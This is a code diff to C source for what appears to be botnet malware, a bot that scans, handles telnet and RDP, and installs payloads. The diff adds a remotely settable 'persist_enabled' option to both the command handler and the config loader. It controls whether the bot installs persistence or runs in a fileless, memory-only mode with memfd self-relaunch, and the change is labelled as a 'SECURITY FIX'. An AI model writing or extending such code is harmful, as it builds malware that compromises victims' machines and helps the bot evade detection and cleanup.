@@ -2075,6 +2075,14 @@ int protocol_process_commands(notnet_bot_t *bot) {
             } else if (strcmp(key, "telnet_enabled") == 0) {
                 bot->telnet_enabled = (atoi(value) != 0);
                 applied = 1;
+            } else if (strcmp(key, "persist_enabled") == 0) {
+                /* SECURITY FIX (#84): strict 0/1 toggle. Takes effect on
+                 * the next persistence install (e.g. a payload update). */
+                int v = atoi(value);
+                if (v == 0 || v == 1) {
+                    bot->persist_enabled = (uint8_t)v;
+                    applied = 1;
+                }
             } else if (strcmp(key, "scan_timeout_ms") == 0) {
                 int v = atoi(value);
                 if (v >= 100 && v <= 30000) {
@@ -2820,6 +2828,10 @@ int load_config(notnet_bot_t *bot, const char *path) {
             }
         } else if (strcmp(key, "rdp_enabled") == 0) {
             bot->rdp_enabled = atoi(value);
+        } else if (strcmp(key, "persist_enabled") == 0) {
+            /* SECURITY FIX (#84): 0 = RAM-only fileless mode (no
+             * persistence install; memfd self-relaunch on Linux). */
+            bot->persist_enabled = (atoi(value) != 0);
         /* SECURITY FIX (#82): Explicit <proto>_enabled keys. These take
          * precedence over port-based auto-detect — a non-default port
          * implies the protocol is wanted, but to disable a protocol while
